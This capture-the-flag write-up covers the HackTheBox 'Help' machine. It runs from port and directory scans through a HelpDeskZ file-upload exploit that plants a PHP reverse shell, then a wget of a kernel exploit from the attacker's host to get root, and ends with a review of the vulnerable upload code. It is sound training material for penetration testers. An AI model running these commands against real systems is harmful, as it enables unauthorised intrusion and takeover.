## Intro

Tags: #linux #OSCPpath #WebApp #FileUpload #VulnOS #easy 

------ 
# Reconnaissance

## Port scan

### Scan specific open TCP ports

```shell
sudo nmap -sC -sV help.htb
```

```shell
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## WebApp

Navigating on port 80 i see the default `Apache2` (2.4.18) page

## Directories

```shell
gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt
```

```shell
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://help.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/06/07 13:03:25 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/support (Status: 301)
=====================================================
2019/06/07 13:05:25 Finished
=====================================================
```
interesting dir found: `/support`

Navigating there, it shows a ticketing system `Help Desk Software by HelpDeskZ`
![](MediaFiles/Pasted%20image%2020261002222952.png)
so lets search for vulnerabilities

----
# Foothold
### Vulnerable web app version

```shell
searchsploit helpdeskz
```

```shell
- HelpDeskZ 1.0.2 - Arbitrary File Upload
- HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download
```
from those two i started with the file upload, also by navigating to the submit a ticket i see these
![](MediaFiles/Pasted%20image%2020261002223110.png)
![](MediaFiles/Pasted%20image%2020261002223118.png)
trying to upload a `.php` file shows message
![](MediaFiles/Pasted%20image%2020261002223156.png)

### File upload bypass

the exploit handles the bypass, by obfuscating the filenames
```shell
/controllers <https://github.com/evolutionscript/HelpDeskZ-1.0/tree/006662bb856e126a38f2bb76df44a2e4e3d37350/controllers>/*submit_ticket_controller.php - Line 141*
$filename = md5($_FILES['attachment']['name'].time()).".".$ext;
```
So now lets run the exploit, by specifying pentestmonkey php rev shell

```shell
python exploit.py http://10.10.10.121/support/uploads/tickets/ php-reverse-shell.php
```
it didnt work! online i found a way to change the time of upload and with that modified exploit it worked!

## Shell as help

got shell and grabbed user flag
```shell
$ id
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
$ python -c 'import pty; pty.spawn("bash")'
help@help:/var/www/html/support/uploads/tickets$ id uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
help@help:/home/help$ cat user.txt
```

---
# Privesc

## Check kernel version
```shell
help@help:~$ uname -a  
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
hmm that does not seem recent to me

## CVE-2017–16995 Exploitation

transfer exploit on target
```shell
wget http://10.10.14.247:9001/exploit.c
```
compile the exploit
```shell
gcc -o exploit exploit.c
```

## Shell as root

and run it
```shell
help@help:/tmp$ ./exploit  
task_struct = ffff88003bae7000  
uidptr = ffff880036ed1cc4  
spawning root shell  
root@help:/tmp# id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help) 
root@help:/tmp# cat /root/root.txt
```
grabbed root flag

----
# Extras

## 2nd way

via graphQL

## WebApp code review

Interestingly , this app is open source and found it on github
https://github.com/ViktorNova/HelpDeskZ
inside the script that seems to handle submissions is `new-ticket.php` inside `/includes/parser`
https://github.com/ViktorNova/HelpDeskZ/blob/master/includes/parser/new_ticket.php
```php
<?php
/**
 * @package HelpDeskZ
 * @website: http://www.helpdeskz.com
 * @community: http://community.helpdeskz.com
 * @author Evolution Script S.A.C.
 * @since 1.0.0
 */
$department = $db->fetchRow("SELECT id, name FROM ".TABLE_PREFIX."departments WHERE autoassign=1 LIMIT 1");
if($text != '' && is_array($department)){
	$user = $db->fetchRow("SELECT COUNT(id) AS total, id FROM ".TABLE_PREFIX."users WHERE email='".$db->real_escape_string($from_email)."'");
	$fullname = $from_name;
	$email = $from_email;	
	if($user['total'] == 0){
		$password = substr((md5(time().$fullname)),5,7);
		$data = array('fullname' => $fullname,
						'email' => $email,
						'password' => sha1($password),
					);
		$db->insert(TABLE_PREFIX."users", $data);
		$user_id = $db->lastInsertId();
		/* Mailer */
		$data_mail = array(
		'id' => 'new_user',
		'to' => $fullname,
		'to_mail' => $email,
		'vars' => array('%client_name%' => $fullname, '%client_email%' => $email, '%client_password%' => $password),
		);
		$mailer = new Mailer($data_mail);
	}else{
		$user_id = $user['id'];	
	}
	$ticket_id = substr(strtoupper(sha1(time().$email)), 0, 11);
	$ticket_id = substr_replace($ticket_id, '-',3,0);
	$ticket_id = substr_replace($ticket_id, '-',7,0);
	$previewcode = substr((md5(time().$fullname)),2,12);
	$data = array(
					'code' => $ticket_id,
					'department_id' => $department['id'],
					'priority_id' => 1,
					'user_id' => $user_id,
					'fullname' => $fullname,
					'email' => $email,
					'subject' => $subject,
					'date' => $datenow,
					'last_update' => $datenow,
					'previewcode' => $previewcode,
					'last_replier' => $fullname,
				);
	$db->insert(TABLE_PREFIX.'tickets', $data);
	$ticketid = $db->lastInsertId();
	$data = array(
					'ticket_id' => $ticketid,
					'date' => time(),
					'message' => ($text),
					'ip' => $_SERVER['REMOTE_ADDR'],
					'email' => $email,
				);
	$db->insert(TABLE_PREFIX.'tickets_messages', $data);
	$message_id = $db->lastInsertId();
	if(is_array($attachments)){
		$save_dir = UPLOAD_DIR;
		foreach($attachments as $attachment) {
		  // get the attachment name
		  $filename = $attachment->filename;
		  // write the file to the directory you want to save it in
		  if ($fp = fopen($save_dir.$filename, 'w')) {
			while($bytes = $attachment->read()) {
			  fwrite($fp, $bytes);
			}
			fclose($fp);
		  }
			
		  $filesize = @filesize(UPLOAD_DIR.$filename);
		  if($filesize){
			  $fileinfo = array('name' => $filename, 'size' => $filesize);
			  $fileverification = verifyAttachment($fileinfo);
			  if($fileverification['msg_code'] == 0){
				$ext = pathinfo($filename, PATHINFO_EXTENSION);
				$filename_encoded = md5($filename.time()).".".$ext;
				$data = array('name' => $filename, 'enc' => $filename_encoded, 'filesize' => $filesize, 'ticket_id' => $ticketid, 'msg_id' => $message_id, 'filetype' => $attachment->content_type);
				$db->insert(TABLE_PREFIX."attachments", $data);
				rename(UPLOAD_DIR.$filename, UPLOAD_DIR.'tickets/'.$filename_encoded);
			  }else{
				unlink(UPLOAD_DIR.$filename);
			  }
		  }
		}
	}
	/* Mailer */
	$data_mail = array(
	'id' => 'new_ticket',
	'to' => $fullname,
	'to_mail' => $email,
	'vars' => array('%client_name%' => $fullname, 
					'%client_email%' => $email, 
					'%ticket_id%' => $ticket_id,
					'%ticket_subject%' => $subject,
					'%ticket_department%' => $department['name'],
					'%ticket_status%' => $LANG['OPEN'],
					'%ticket_priority%' => 'Low',
					),
	);
	$mailer = new Mailer($data_mail);
}
?>
```
this snippet of the above code handles upload:
```shell
if(is_array($attachments)){
		$save_dir = UPLOAD_DIR;
		foreach($attachments as $attachment) {
		  // get the attachment name
		  $filename = $attachment->filename;
		  // write the file to the directory you want to save it in
		  if ($fp = fopen($save_dir.$filename, 'w')) {
			while($bytes = $attachment->read()) {
			  fwrite($fp, $bytes);
			}
			fclose($fp);
		  }
			
		  $filesize = @filesize(UPLOAD_DIR.$filename);
		  if($filesize){
			  $fileinfo = array('name' => $filename, 'size' => $filesize);
			  $fileverification = verifyAttachment($fileinfo);
			  if($fileverification['msg_code'] == 0){
				$ext = pathinfo($filename, PATHINFO_EXTENSION);
				$filename_encoded = md5($filename.time()).".".$ext;
				$data = array('name' => $filename, 'enc' => $filename_encoded, 'filesize' => $filesize, 'ticket_id' => $ticketid, 'msg_id' => $message_id, 'filetype' => $attachment->content_type);
				$db->insert(TABLE_PREFIX."attachments", $data);
				rename(UPLOAD_DIR.$filename, UPLOAD_DIR.'tickets/'.$filename_encoded);
			  }else{
				unlink(UPLOAD_DIR.$filename);
			  }
		  }
		}
```